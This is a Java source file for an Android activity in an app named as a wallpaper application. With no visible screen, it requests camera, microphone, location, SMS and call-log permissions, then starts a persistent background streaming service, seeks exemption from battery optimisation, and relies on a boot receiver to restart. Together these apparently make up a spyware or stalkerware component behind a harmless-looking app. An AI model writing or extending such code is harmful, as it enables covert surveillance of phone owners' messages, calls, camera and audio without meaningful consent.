package com.example.wallpaperapplication;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.Toast;

import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.ContextCompat;
import androidx.preference.PreferenceManager;

import java.util.ArrayList;
import java.util.List;
import java.util.Map;

public class ConsentActivity extends AppCompatActivity {

    private static final String PREFS = "app_prefs";
    private static final String KEY_STREAM_OPT_IN = "stream_opt_in";
    private static final String KEY_CONSENT_GIVEN = "consent_given";

    private static final boolean NEED_BACKGROUND_LOCATION = false;
    private static final boolean REQUEST_SMS_AND_CALLLOG = true;
    private static final int REQ_BACKGROUND_LOCATION = 2001;

    private final ActivityResultLauncher<String[]> permLauncher =
            registerForActivityResult(new ActivityResultContracts.RequestMultiplePermissions(), this::onPermResult);

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        // (Optional) setContentView(R.layout.activity_consent);
        requestAllNeeded();
    }

    private void requestAllNeeded() {
        List<String> perms = new ArrayList<>();
        perms.add(Manifest.permission.CAMERA);
        perms.add(Manifest.permission.RECORD_AUDIO);

        // Location optional for streaming; include only if you use it
        perms.add(Manifest.permission.ACCESS_FINE_LOCATION);

        if (Build.VERSION.SDK_INT >= 33) {
            perms.add(Manifest.permission.POST_NOTIFICATIONS);
        }

        if (REQUEST_SMS_AND_CALLLOG) {
            // Request only what’s declared in manifest
            perms.add(Manifest.permission.READ_SMS);
            perms.add(Manifest.permission.READ_CALL_LOG);
        }

        permLauncher.launch(perms.toArray(new String[0]));
    }

    private void onPermResult(Map<String, Boolean> result) {
        boolean cam  = granted(result, Manifest.permission.CAMERA);
        boolean mic  = granted(result, Manifest.permission.RECORD_AUDIO);
        boolean noti = (Build.VERSION.SDK_INT < 33) || granted(result, Manifest.permission.POST_NOTIFICATIONS);

        if (cam && mic && noti) {
            if (NEED_BACKGROUND_LOCATION) {
                maybeRequestBackgroundLocation();
            }
            persistConsentGiven(true);
            persistOptIn(true);
            startStreamingService();
            requestIgnoreBatteryOptimizationsIfNeeded();
            Toast.makeText(this, "Streaming enabled.", Toast.LENGTH_SHORT).show();

            setResult(Activity.RESULT_OK);
            finish();
        } else {
            maybeOpenAppSettingsIfPermanentlyDenied();
            requestIgnoreBatteryOptimizationsIfNeeded();
            Toast.makeText(this, "Camera, microphone, and notifications are required.", Toast.LENGTH_LONG).show();

            setResult(Activity.RESULT_CANCELED);
            finish();
        }
    }

    private boolean granted(@NonNull Map<String, Boolean> map, @NonNull String perm) {
        Boolean ok = map.get(perm);
        return ok != null && ok;
    }

    private void maybeRequestBackgroundLocation() {
        if (!NEED_BACKGROUND_LOCATION) return;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION)
                    != PackageManager.PERMISSION_GRANTED) {
                requestPermissions(new String[]{ Manifest.permission.ACCESS_BACKGROUND_LOCATION }, REQ_BACKGROUND_LOCATION);
            }
        }
    }

    private void startStreamingService() {
        Intent svc = new Intent(this, StreamingService.class);
        try {
            ContextCompat.startForegroundService(this, svc);
        } catch (IllegalStateException ignored) {
            // If background start is restricted now, BootReceiver can start it later.
        }
    }

    private void persistOptIn(boolean enabled) {
        SharedPreferences sp = getSharedPreferences(PREFS, MODE_PRIVATE);
        sp.edit().putBoolean(KEY_STREAM_OPT_IN, enabled).apply();
    }

    private void persistConsentGiven(boolean given) {
        PreferenceManager.getDefaultSharedPreferences(this)
                .edit().putBoolean(KEY_CONSENT_GIVEN, given).apply();
    }

    private void maybeOpenAppSettingsIfPermanentlyDenied() {
        boolean cameraDeniedForever = deniedForever(Manifest.permission.CAMERA);
        boolean micDeniedForever    = deniedForever(Manifest.permission.RECORD_AUDIO);
        boolean notiDeniedForever   = (Build.VERSION.SDK_INT >= 33) && deniedForever(Manifest.permission.POST_NOTIFICATIONS);

        if (cameraDeniedForever || micDeniedForever || notiDeniedForever) {
            try {
                Intent i = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                i.setData(Uri.fromParts("package", getPackageName(), null));
                startActivity(i);
            } catch (Exception ignored) {}
        }
    }

    private boolean deniedForever(String permission) {
        if (ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED) return false;
        return !shouldShowRequestPermissionRationale(permission); // false when “Don’t ask again” checked
    }

    private void requestIgnoreBatteryOptimizationsIfNeeded() {
        android.os.PowerManager pm = (android.os.PowerManager) getSystemService(POWER_SERVICE);
        String pkg = getPackageName();
        if (pm != null && !pm.isIgnoringBatteryOptimizations(pkg)) {
            try {
                Intent i = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                i.setData(Uri.parse("package:" + pkg));
                startActivity(i);
            } catch (Exception e) {
                try {
                    Intent i = new Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS);
                    startActivity(i);
                } catch (Exception ignored) {}
            }
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] perms, @NonNull int[] results) {
        super.onRequestPermissionsResult(requestCode, perms, results);
        if (requestCode == REQ_BACKGROUND_LOCATION) {
            // Optional only; no change to result code
            boolean granted = results.length > 0 && results[0] == PackageManager.PERMISSION_GRANTED;
            if (!granted) {
                Toast.makeText(this, "Background location not granted (optional).", Toast.LENGTH_SHORT).show();
            }
        }
    }
}
